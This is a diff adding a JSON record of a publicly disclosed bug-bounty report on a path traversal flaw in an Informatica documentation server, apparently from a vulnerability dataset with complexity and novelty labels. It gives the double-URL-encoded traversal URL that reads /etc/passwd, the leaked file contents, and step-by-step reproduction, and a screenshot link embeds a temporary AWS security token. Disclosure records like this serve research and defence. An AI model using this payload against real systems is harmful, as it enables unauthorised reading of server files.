@@ -1,0 +1,40 @@
+{
+    "reported_to": "Informatica",
+    "reported_by": "bigbear_ ",
+    "title": "[doc.rt.informaticacloud.com] Arbitrary File Reading via Double URL Encode",
+    "content": "\nHi. Attacker can read arbitrary file in system via next query:\nCode 160 Bytes\n1http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/topic/com.activee.bpep.doc/images/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd\n<image_0>\nCode 1.17 KiB\n1root:x:0:0:root:/root:/bin/bash\n2daemon:x:1:1:daemon:/usr/sbin:/bin/sh\n3bin:x:2:2:bin:/bin:/bin/sh\n4sys:x:3:3:sys:/dev:/bin/sh\n5sync:x:4:65534:sync:/bin:/bin/sync\n6games:x:5:60:games:/usr/games:/bin/sh\n7man:x:6:12:man:/var/cache/man:/bin/sh\n8lp:x:7:7:lp:/var/spool/lpd:/bin/sh\n9mail:x:8:8:mail:/var/mail:/bin/sh\n10news:x:9:9:news:/var/spool/news:/bin/sh\n11uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\n12proxy:x:13:13:proxy:/bin:/bin/sh\n13www-data:x:33:33:www-data:/var/www:/bin/sh\n14backup:x:34:34:backup:/var/backups:/bin/sh\n15list:x:38:38:Mailing List Manager:/var/list:/bin/sh\n16irc:x:39:39:ircd:/var/run/ircd:/bin/sh\n17gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\n18nobody:x:65534:65534:nobody:/nonexistent:/bin/sh\n19libuuid:x:100:101::/var/lib/libuuid:/bin/sh\n20syslog:x:101:103::/home/syslog:/bin/false\n21messagebus:x:102:105::/var/run/dbus:/bin/false\n22landscape:x:103:108::/var/lib/landscape:/bin/false\n23sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\n24ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n25puppet:x:105:111:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false\n26vrangan:x:1001:1001::/home/vrangan:/bin/bash\n27avahi:x:106:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/188/500/8e2b60c56f85a9ab8b495cdbf4888f343ad81f75/2017-05-27_13-21-01.png?response-content-disposition=attachment%3B%20filename%3D%222017-05-27_13-21-01.png%22%3B%20filename%2A%3DUTF-8%27%272017-05-27_13-21-01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4RDPBG2Z%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021859Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGGH331%2Bzp2R%2F3jzEDRZXWcGyNkXVm4l37jsrrngdhS3AiEAiGKoE%2BpbO4KbVLe2k%2BDcqavCzJMwtCDETSjwTqVf2QMqugUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDD9b1dAzPquDLyR64yqOBbDdMMB6qRiZbGj5ntUaOEuErgIaX0VyjFKOdAv8USvULuMUqjn0OpXaE%2FLmuqHwwSM21%2FVpSZlTq83Y7vOVS2eeF8XjZ1WQ7vIvEcY7AdX0eMbac77lcCB4RxK9kvRhcZYCIdAF%2FREEy7ZpMzm5BfyBPC2AaWFudYPoijGzHRa1xtmw8ZC4kRymq6hn%2F4l6EGAC43TTWjjXlYrfoT16B7zJv9JX%2Bk965dMsxFrX%2BKtCFDOLQYpSSUSw3GHmNBQWOpprJ9eB%2Bhmdrp9W8XK1u%2BGCQE%2BaS2PYwsDMkPfbCSnCJs9Fp9QP%2BIPczrURYaazZb%2F5xx6O1niQSUZGElZpjOvGkosJ40d5Oj6i6ElK9ALWKph1lwNLL4UkPex4t2RglP6mm%2B%2F6rxMW%2Bn41B%2By7jgh%2FklODd8pIPZqfu16zYwpdHfeQh8w9p03LhGbLr9CB9rlESYDPOnBm5BQZ6rk708GIcgjtCiUqikJt81Xh5vWwQ0xqU7Lw4mB%2BBUf74QeaGHzG4Wu%2FQCdBLHDyVi2fzGIwpt%2F1NY%2BBLG3kLMi67zFDltERgDCXGzqBvOPT9RZL7kluufKLjpNKroirqZPBoX3qNLSXOdy3otN%2FAJGJUO6BVy%2BbRoXqWowrX%2Fx6yr067GUM%2F1UXPFaOErEPTpVGnlBe56ssOXrBJXWBSOrDMeTSn2ofZ9AT%2F7EFAlamOiSxB1dWguNf7DC2Wxo2Hkd3y2jiHELq4uqCqcloB81hHnswIpxUxTvpz7Fx0U6dn0EppJZSgPaoX389BVcsmm1MTygTO1e1N%2B5y1E6IqbNwdAjnooP4mlaVIfd%2BmItX%2FBbIyUrzclTCs5qx1s3YqDV%2FnPDXlDkG2f0pymIl4RuRCDCJ84e%2FBjqxAdBjfelTIjQNt5OmwjqwnEC%2B2k%2Fi%2B%2FnCbWRx5jGMsl%2BBDw3WyQ%2BdMc98N2kltrLhYUngG91IDwo2wQcESeG2WiytY6EaItO0vDlYwYDAQACYfwmfCa6InheZUeBiyisGvON%2BzpFiC2d4%2FFEVjLODKA66zdsYAnpY%2F8plOozk%2B%2FifqMoRnX8NixExqtMAgyITi2Ix82EJls2oavnrXaQIZapNo58Ejj3e7h7vmu4gVS9P1A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b1f5070f44df130096d0bca1ebcb5e983ec7f48be9baf7321c4935a8d00187f0"
+    },
+    "disclosed_date": 1658588580,
+    "report_url": "https://hackerone.com/reports/232371",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Construct a URL with double URL encoding to traverse directories, e.g., http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/topic/com.activee.bpep.doc/images/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd"
+        ],
+        [
+            2,
+            "Access the constructed URL in a web browser or via a tool like curl to read the contents of the /etc/passwd file"
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to read arbitrary files on the system by exploiting a path traversal flaw via double URL encoding in the web application's URL. This bypasses normal security checks that might prevent directory traversal attacks.",
+    "reason": "The attack involves a straightforward manipulation of the URL to include double-encoded directory traversal sequences. This technique is well-known and does not require understanding complex application states or novel logic. The interaction between the URL encoding and the server's path resolution is a common vulnerability pattern.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
